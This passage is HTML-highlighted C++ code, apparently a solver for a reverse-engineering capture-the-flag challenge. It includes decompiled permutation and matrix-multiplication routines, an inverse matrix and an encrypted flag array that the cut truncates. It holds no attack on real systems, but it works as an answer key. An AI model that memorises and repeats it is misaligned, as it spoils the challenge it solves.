string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;time.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">Enc1</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>RdList<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">char</span> v3<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// [esp+D3h] [ebp-1Dh]</span>\n    size_t i<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// [esp+DCh] [ebp-14h]</span>\n    size_t v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+E8h] [ebp-8h]</span>\n\n    v5 <span class=\"token operator\">=</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> result <span class=\"token operator\">=</span> v5 <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> v5 <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> v5<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            v3 <span class=\"token operator\">=</span> Str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            Str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Str<span class=\"token punctuation\">[</span>v5 <span class=\"token operator\">-</span> RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            Str<span class=\"token punctuation\">[</span>v5 <span class=\"token operator\">-</span> RdList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">Enc2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// [esp+D0h] [ebp-20h]</span>\n    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// [esp+DCh] [ebp-14h]</span>\n    <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+E8h] [ebp-8h]</span>\n\n    v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j<span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">*</span><span class=\"token operator\">&amp;</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a2<span class=\"token punctuation\">[</span>v4<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> dword_3FC368<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> inv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">Enc3</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n    <span class=\"token keyword\">int</span> k<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [esp+D0h] [ebp-20h]</span>\n    <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [esp+DCh] [ebp-14h]</span>\n    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [esp+E8h] [ebp-8h]</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            a3<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>k<span class=\"token punctuation\">)</span>\n                a3<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token operator\">*</span><span class=\"token operator\">&amp;</span>a2<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> k <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        result <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">Dec2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span>\n\n    v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j<span class=\"token punctuation\">)</span>\n            a2<span class=\"token punctuation\">[</span>v4<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> EncFlag<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token 